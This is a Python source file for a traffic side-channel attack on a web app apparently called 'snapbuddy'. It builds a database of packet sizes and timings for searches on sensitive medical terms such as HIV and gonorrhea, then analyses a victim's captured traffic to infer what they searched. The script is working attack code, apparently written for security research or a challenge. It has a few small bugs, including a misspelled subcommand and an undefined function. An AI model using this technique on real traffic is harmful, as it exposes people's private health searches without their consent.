import argparse
import json
import sys
import search
import packetcollector
import processpackets
import time
import numpy

# used for side channel attack on search termss

# work around for this issue:
# http://stackoverflow.com/questions/5530708/can-i-redirect-unicode-output-from-the-console-directly-into-a-file
import codecs
sys.stdout=codecs.getwriter('utf-8')(sys.stdout)

# the amount to subtract from keys in the database
ZERO_SSID_LENGTH_PY_REQUESTS = 576
ZERO_SSID_LENGTH_FIREFOX = 896
# amount to adjust firefox sizes by
FIREFOX_ADJUSTMENT = -1 * (ZERO_SSID_LENGTH_FIREFOX - ZERO_SSID_LENGTH_PY_REQUESTS)
t = 2 # how many stdevs we expect special search times to be within

class SearchAttackDb(object):

    terms = ["HIV", "cancer", "diabetes", "malaria", "lupus", "dyslexia", "epilepsy", "fibromyalgia", 
"pericarditis", "angina", "anemia", "ringworm", "polio", "gonorrhea", "diarrhea"]

    def __init__(self, hostname, port):
        self.hostname = hostname
        self.port = port

        # maps request size to search term and response size
        self.request_size_map = {}
        
    # build up database of term req/resp sizes and timing stats
    def build(self, username, password, interface):
        times = []
        searcher = search.Search(self.hostname, self.port, username, password)
       
        for term in self.terms:
            with packetcollector.PacketCollector(interface, "tcp port {}".format(self.port)) as packet_collector:
                searcher.do_search(term)
                # give it time for the packets to be collected
                time.sleep(1)
                packet_collector.stop()
                pcap = packet_collector.get_pcap()
                transactions = processpackets.get_transactions(pcap, self.hostname, self.port)
                assert(len(transactions) == 8)

                loginTrans = transactions[4]
                response_size = loginTrans.get_resp_size()
                norm = response_size
                
                lastTrans = transactions[-1]
                request_size = lastTrans.get_req_size()
                #normalize for the length of the displayed username
                response_size = lastTrans.get_resp_size() - norm
                duration = lastTrans.get_duration()
                times.append(duration)
                
                if self.request_size_map.has_key(request_size):
                    self.request_size_map[request_size].append((term, response_size))
                else:
                    self.request_size_map[request_size] = [(term, response_size)]

        self.avg_response_time = numpy.mean(times)
        self.stdev_response_time = numpy.std(times)
	    #print (self.avg_response_time, self.stdev_response_time)

    def save(self, db_filename):
        '''
        Saves the database to the file
        '''
        print "saving to " + db_filename
        with open(db_filename, 'w') as writer:
            dic = {"requests" : self.request_size_map,
                    "avg_time" : self.avg_response_time,
                    "stdev_time" : self.stdev_response_time}
            json.dump(dic, writer)

    def load(self, db_filename):
        with open(db_filename, 'r') as reader:
            tempDict = json.load(reader)
            # Note: json has turned our ints into strings, so we have to convert them back
            self.request_size_map = self.intify(tempDict["requests"])
            self.avg_response_time = float(tempDict["avg_time"])
            self.stdev_response_time = float(tempDict["stdev_time"])
    
 	    #print ("stdev response time", self.stdev_response_time)
	    #print ("avg", self.avg_response_time) 
    # transform dictionary keys from strings to ints       
    def intify(self, dic):
          actualDict = {}
          for key, value in dic.items():
                actualDict[int(key)] = value
          return actualDict
          

    def find_search_term_from_pcap(self, pcap, adjustment=0):
        transactions = processpackets.get_transactions(pcap, self.hostname, self.port)
        potentialTerms = []
        
        login_trans = transactions[4]
        # variation in login response size is only due to length of username --
        # use this to normalize search response sizes, which include username
        norm = login_trans.get_resp_size() 
        
        for i, trans in enumerate(transactions):
            request_size = trans.get_req_size()
            #normalize by the length of the displayed username
            response_size = trans.get_resp_size()-norm
            duration = trans.get_duration()
	               
            if (duration > self.avg_response_time - t*self.stdev_response_time):
	
                if self.request_size_map.has_key(request_size):
                    candidates = self.request_size_map[request_size]
                    this_search=[]
                    for (term, respSize) in candidates:
                        # need wiggle room even with normalization, due to padding
                        if abs(respSize-response_size) < 32:
                            this_search.append(term);
                    if len(this_search)==0:
                        potentialTerms.append(str(i) + " unidentified search")
                    else:
                        potentialTerms.append(str(i) + " search for " + " or ".join(this_search))
                else: #unknown request size
                    potentialTerms.append(str(i) + " unknown transaction")
            else: # unknown duration
                potentialTerms.append(str(i) + " unknown transaction")
        return potentialTerms


def build(hostname, port, username, password, interface, db_output):
    attack_db = SearchAttackDb(hostname, port)
    attack_db.build(username, password, interface)
    attack_db.save(db_output)

def find(hostname, port, dbname, target_pcap, use_adjustment):
    attack_db = SearchAttackDb(hostname, port)
    attack_db.load(dbname)

    adjustment = 0
    if use_adjustment:
        adjustment = FIREFOX_ADJUSTMENT

    print "Target performed the following transactions: "
    terms = attack_db.find_search_term_from_pcap(processpackets.read_pcap(target_pcap), adjustment=adjustment)
    if len(terms) == 0:
        print "could not find any search terms"
        return
    for term in terms:
        print term

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("serverip", help="the server ip address")
    parser.add_argument("serverport", type=int, help="the server port")
    subparsers = parser.add_subparsers(dest="command")
    buildparser = subparsers.add_parser('build', help='Build a new database')
    buildparser.add_argument("username", help="a username to use to login to snapbuddy")
    buildparser.add_argument("password", help="the password for the username")
    buildparser.add_argument("interface", help="the interface to use when building the database (required when building)")
    buildparser.add_argument("outfile", help="specify the filename for the database to build")

    findparser = subparsers.add_parser('find', help="Find a user from a pcap")
    findparser.add_argument('dbname', help='filename of a prebuilt database to consult')
    findparser.add_argument('pcap', help='pcap file of observed session')
    findparser.add_argument('--useffadjustment', default=False, action="store_true", help="adjust values to account for FireFox")

    collisionparser = subparsers.add_parser('cosllisions')
    collisionparser.add_argument('dbname', help='filename of a prebuilt database to consult')

    args = parser.parse_args()
    if args.command == 'build':
        build(args.serverip, args.serverport, args.username, args.password, args.interface, args.outfile)
    elif args.command == 'find':
        find(args.serverip, args.serverport, args.dbname, args.pcap, args.useffadjustment)
    elif args.command == 'collisions':
        collisions(args.serverip, args.serverport, args.dbname)

if __name__ == "__main__":
    main()
